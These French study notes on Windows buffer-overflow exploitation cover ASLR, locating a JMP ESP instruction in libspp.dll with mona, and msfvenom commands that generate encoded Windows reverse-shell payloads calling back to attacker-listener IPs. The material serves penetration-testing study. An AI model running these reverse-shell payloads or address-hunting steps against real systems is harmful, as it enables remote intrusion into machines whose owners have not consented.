Attention à ASLR (Adress space layout randomization)
On peut chercher une adresse dans un autre exploit
Copier les DLLs de la victime  sur notre machine et utiliser des outils comme un dessassbembleur (objdump) pour obtenir une adresse
Attention aux charactères proscrits

# Chercher une instruction
Pour trouver l'adresse d'une instruction

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
#jmp esp FFE4 \xff\xe4
!mona modules
!mona find -s "\xff\xe4" -m libspp.dll
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

jump esp est FEE4. Ici on chercher dans libspp.dll

# msfvenom
génère une charge dans un language en excluant certains charactères

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-p 	Charge
-f	language de sortie
-e	encodeur (plateforme)
-b	charactères proscrits

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.245 LPORT=4433 -f exe -o rev.exe
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
